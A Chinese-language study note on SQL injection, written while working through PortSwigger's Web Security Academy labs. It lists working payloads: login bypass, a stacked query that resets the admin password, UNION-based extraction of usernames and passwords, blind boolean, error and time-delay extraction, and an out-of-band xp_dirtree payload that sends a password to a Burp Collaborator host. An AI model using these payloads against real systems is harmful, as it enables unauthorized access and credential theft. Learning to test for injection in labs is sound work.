---
tags: [Web, 网络安全, 白帽子]
last_modified_time: 2022-05-23 18:31:35 +0800
---

本文是通过 [Learning path \| Web Security Academy - PortSwigger](https://portswigger.net/web-security/learning-path) 学习web安全的笔记。该站点是 BurpSuite 的官方网站，其创建者是《黑客攻防技术宝典——Web实战篇》（英文名是 The Web Application Hacker's Handbook）的作者。另外 Kali 官网也有相关的学习资源，不过大多收费（主要是指 [Infosec Training & Penetration Testing \| Offensive Security](https://www.offensive-security.com/)）

<p id="markdown-toc"></p>
<!-- vim-markdown-toc GFM -->

* [SQL 注入](#sql-注入)
    * [获取隐藏数据](#获取隐藏数据)
        * [`' or 1=1-- `](#-or-11---)
    * [推翻程序逻辑](#推翻程序逻辑)
        * [`administrator'--`](#administrator--)
    * [从其他表里获取数据](#从其他表里获取数据)
        * [UNION攻击](#union攻击)
            * [判断有几列](#判断有几列)
                * [`order by`](#order-by)
                * [`union select null,null,...`](#union-select-nullnull)
            * [查找有用数据类型的列](#查找有用数据类型的列)
            * [获取数据](#获取数据)
            * [在一列里获取多个值](#在一列里获取多个值)
    * [获取数据库信息](#获取数据库信息)
        * [查询数据库类型和版本](#查询数据库类型和版本)
        * [列出数据库的内容](#列出数据库的内容)
    * [盲SQL注入](#盲sql注入)
        * [通过触发条件响应](#通过触发条件响应)
        * [通过触发 SQL 错误来诱导条件响应](#通过触发-sql-错误来诱导条件响应)
        * [通过触发时间延迟](#通过触发时间延迟)
        * [通过带外（OAST）技术](#通过带外oast技术)

<!-- vim-markdown-toc -->

## SQL 注入
学习链接：
* [What is SQL Injection? Tutorial & Examples \| Web Security Academy](https://portswigger.net/web-security/sql-injection)

参考手册：
* [SQL injection cheat sheet \| Web Security Academy](https://portswigger.net/web-security/sql-injection/cheat-sheet)

常见例子：
* 获取隐藏数据
* 推翻程序逻辑
* 从其他表里获取数据
* 获取数据库信息
* 盲SQL注入

### 获取隐藏数据
#### `' or 1=1-- `
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

技巧总结：
* 由于所有类型的数据库均可使用`-- `（注意有个空格）来注释，故采用该方式注释比较通用
* 由于`1=1`可能被安全过滤了，所以可以尝试`'a'='a'`等方案

### 推翻程序逻辑
#### `administrator'--`
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

技巧总结：
* 有的程序登录时先查用户对应的密码，再去比较密码，即类似下面的逻辑：
  ```php
  ...
  $rows=($conn->query("SELECT username,password FROM user_info WHERE username = '$username'"));
  $row= $rows->fetch();
  if($row['username']==$username &&$row['password']==$password){
  ...
  ```
  这时可以注入 UPDATE 语句来成功登录：
  ```sql
  admin'; update user_info set password = 'admin' where username = 'admin'-- 
  ```
  
### 从其他表里获取数据
#### UNION攻击
##### 判断有几列
###### `order by`
```sql
select xxx,xxx from xxx order by 3
select xxx,xxx from xxx order by 2
...
```

###### `union select null,null,...`
```sql
select xxx,xxx from xxx where xxx='xxx' union select null,null,null
select xxx,xxx from xxx where xxx='xxx' union select null,null
...
```


##### 查找有用数据类型的列
```sql
select xxx,xxx from xxx where xxx='xxx' UNION SELECT 'a',NULL--
select xxx,xxx from xxx where xxx='xxx' UNION SELECT NULL,'a'--
```

##### 获取数据
```sql
select xxx,xxx from xxx where xxx='xxx' UNION SELECT username, password FROM users--
```

##### 在一列里获取多个值
```sql
select xxx from xxx where xxx='xxx' UNION SELECT username || '~' || password FROM users--
```

### 获取数据库信息
#### 查询数据库类型和版本

| Database type    | Query                     |
|------------------|---------------------------|
| Microsoft, MySQL | `SELECT @@version`        |
| Oracle           | `SELECT * FROM v$version` |
| PostgreSQL       | `SELECT version()`        |

#### 列出数据库的内容

| Database type | Query                                                                                                                    |
|---------------|--------------------------------------------------------------------------------------------------------------------------|
| Oracle        | `SELECT * FROM all_tables; SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`                           |
| non-Oracle    | `SELECT * FROM information_schema.tables; SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

### 盲SQL注入
#### 通过触发条件响应
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm'
```

#### 通过触发 SQL 错误来诱导条件响应
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a'
```

#### 通过触发时间延迟
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:10'--
```

#### 通过带外（OAST）技术
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```


